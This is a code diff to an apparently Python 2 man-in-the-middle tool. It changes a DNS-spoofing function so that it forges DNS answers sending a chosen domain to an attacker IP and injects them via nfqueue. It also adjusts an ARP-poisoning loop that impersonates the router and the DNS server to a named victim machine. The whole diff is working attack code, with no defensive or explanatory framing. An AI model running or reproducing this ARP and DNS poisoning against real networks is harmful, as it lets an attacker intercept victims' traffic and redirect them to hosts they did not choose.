@@ -709,11 +709,10 @@ class Parser():
 				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
 
 	def dnsspoof_actions(self, dns_layer, IP_src, IP_dst, sport, dport, payload, rIP):
-		payload.set_verdict(nfqueue.NF_DROP)
-		print G+'[+] DNS request for '+W+self.args.dnsspoof+G+' found; dropping packet and injecting spoofed one redirecting to '+W+rIP
-		logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one redirecting to '+rIP+'\n')
+#		print G+'[+] DNS request for '+W+self.args.dnsspoof+G+' found; dropping packet and injecting spoofed one redirecting to '+W+rIP
+#		logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one redirecting to '+rIP+'\n')
 		p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=rIP))
-		send(p)
+		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
 		print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof+G+' to '+W+rIP
 		logger.write('[!] Sent spoofed packet for '+self.args.dnsspoof+' to '+rIP+'\n')
 
@@ -1034,13 +1033,15 @@ def main(args):
 		except Exception:
 			exit("[-] Could not get victim MAC address; try the -vmac [xx:xx:xx:xx:xx:xx] option if you know the victim's MAC address")
 	if dnsIP != routerIP:
-		try:
-			dnsMAC = Spoof().originalMAC(dnsIP)
-			print "[*] DNS server MAC: " + dnsMAC
-		except Exception:
-			print "[-] Could not get DNS server MAC address; continuing"
-	if dnsIP == routerIP:
-		dnsMAC = routerMAC
+		if IPprefix in dnsIP:
+			try:
+				dnsMAC = Spoof().originalMAC(dnsIP)
+				print "[*] DNS server MAC: " + dnsMAC
+			except Exception:
+				print "[-] Could not get DNS server MAC address; continuing"
+				dnsMAC = routerMAC
+		else:
+			dnsMAC = routerMAC
 
 	setup(victimMAC)
 	Queued(args)
@@ -1080,7 +1081,7 @@ def main(args):
 
 	while 1:
 		# If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
-		if not dnsIP == routerIP and dnsMAC:
+		if dnsIP != routerIP and dnsMAC != routerMAC:
 			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
 		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
 		time.sleep(1.5)
